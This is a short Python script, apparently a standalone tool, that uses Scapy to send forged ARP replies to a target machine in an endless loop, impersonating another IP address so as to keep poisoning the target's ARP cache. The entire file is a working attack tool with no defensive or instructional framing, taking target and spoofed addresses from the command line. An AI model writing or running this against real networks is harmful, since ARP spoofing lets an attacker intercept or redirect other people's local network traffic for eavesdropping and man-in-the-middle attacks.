# arp_poison.py
from scapy.all import ARP, Ether, sendp
import time
import sys

def arp_poison(target_ip, target_mac, source_ip):
    # Create the malicious ARP packet
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)

    # Send the packet in a loop to maintain the ARP poisoning
    while True:
        sendp(Ether(dst=target_mac)/arp_packet, verbose=0)
        time.sleep(10)

# Get IP and MAC addresses from command line arguments
target_ip, target_mac, source_ip = sys.argv[1], sys.argv[2], sys.argv[3]

arp_poison(target_ip, target_mac, source_ip)
